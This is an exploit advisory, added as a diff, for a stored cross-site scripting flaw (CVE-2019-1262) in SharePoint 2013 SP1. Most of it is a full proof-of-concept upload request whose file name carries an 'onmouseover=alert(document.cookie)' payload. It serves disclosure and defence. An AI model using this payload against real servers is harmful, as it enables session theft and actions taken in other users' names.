@@ -1,0 +1,177 @@
+# Exploit Title: Microsoft SharePoint 2013 SP1 - 'DestinationFolder' Persistent Cross-Site Scripting
+# Author: Davide Cioccia
+# Discovery Date: 2019-09-25
+# Vendor Homepage: https://www.microsoft.com
+# Software Link: https://support.microsoft.com/en-us/help/2880552/description-of-microsoft-sharepoint-server-2013-service-pack-1-sp1
+# Tested Version: SP1
+# Tested on: Microsoft Windows Server 2016
+# CVE: CVE-2019-1262
+# Advisory ID: ZSL-2019-5533
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5533.php
+# MSRC: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1262
+
+Vendor: Microsoft Corporation
+Product web page: https://www.microsoft.com
+Affected version: 2013 SP1
+
+Summary: SharePoint is a web-based collaborative platform that
+integrates with Microsoft Office. Launched in 2001, SharePoint
+is primarily sold as a document management and storage system,
+but the product is highly configurable and usage varies substantially
+among organizations.
+
+Desc: A cross-site-scripting (XSS) vulnerability exists when Microsoft
+SharePoint Server does not properly sanitize a specially crafted web
+request to an affected SharePoint server. An authenticated attacker
+could exploit the vulnerability by sending a specially crafted request
+to an affected SharePoint server. The attacker who successfully exploited
+the vulnerability could then perform cross-site scripting attacks on
+affected systems and run script in the security context of the current
+user. The attacks could allow the attacker to read content that the
+attacker is not authorized to read, use the victim's identity to take
+actions on the SharePoint site on behalf of the user, such as change
+permissions and delete content, and inject malicious content in the
+browser of the user.
+
+Sharepoint 2013 SP1 allows users to upload files to the platform, but
+does not correctly sanitize the filename when the files are listed. An
+authenticated user that has the rights to upload files to the SharePoint
+platform, is able to exploit a Stored Cross-Site Scripting vulnerability
+in the filename. The filename is reflected in the attribute 'aria-label'
+of the following HTML tag.
+
+# PoC request:
+
+
+POST /FOLDER/_layouts/15/Upload.aspx?List={689D112C-BDAA-4B05-B0CB-0DFB36CF0649}&RootFolder=&IsDlg=1 HTTP/1.1
+Host: vulnerable_sharepoint_2013
+Connection: close
+Content-Length: 31337
+Cache-Control: max-age=0
+Authorization: Negotiate YIIV9gYGKwYBBQUCo........................JBAq39IdJh3yphI1uHbz/jbQ==
+Origin: https://vulnerable_sharepoint_2013.tld
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryewNI1MC6qaHDB50n
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
+Sec-Fetch-Mode: nested-navigate
+Sec-Fetch-User: ?1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,it-IT;q=0.8,it;q=0.7,nl;q=0.6
+Cookie: ...
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOWebPartPage_PostbackSource"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOTlPn_SelectedWpId"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOTlPn_View"
+
+0
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOTlPn_ShowSettings"
+
+False
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOGallery_SelectedLibrary"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOGallery_FilterString"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOTlPn_Button"
+
+none
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__EVENTTARGET"
+
+ctl00$PlaceHolderMain$ctl00$RptControls$btnOK
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOSPWebPartManager_DisplayModeName"
+
+Browse
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOSPWebPartManager_ExitingDesignMode"
+
+false
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOWebPartPage_Shared"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOLayout_LayoutChanges"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOLayout_InDesignMode"
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOSPWebPartManager_OldDisplayModeName"
+
+Browse
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOSPWebPartManager_StartWebPartEditingName"
+
+false
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="MSOSPWebPartManager_EndWebPartEditing"
+
+false
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="_maintainWorkspaceScrollPosition"
+
+0
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__REQUESTDIGEST"
+
+[DIGEST]
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__VIEWSTATE"
+
+[VIEWSTATE]
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+E6912F23
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__SCROLLPOSITIONX"
+
+0
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__SCROLLPOSITIONY"
+
+0
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+
+
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="destination"
+
+[DESTINATION_FOLDER]
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="ctl00$PlaceHolderMain$ctl01$ctl04$InputFile"; filename="' onmouseover=alert(document.cookie) '.jpg"
+Content-Type: image/jpeg
+
+
+ZSL
+------WebKitFormBoundaryewNI1MC6qaHDB50n
+Content-Disposition: form-data; name="ctl00$PlaceHolderMain$ctl01$ctl04$OverwriteSingle"
+
+on
+------WebKitFormBoundaryewNI1MC6qaHDB50n--
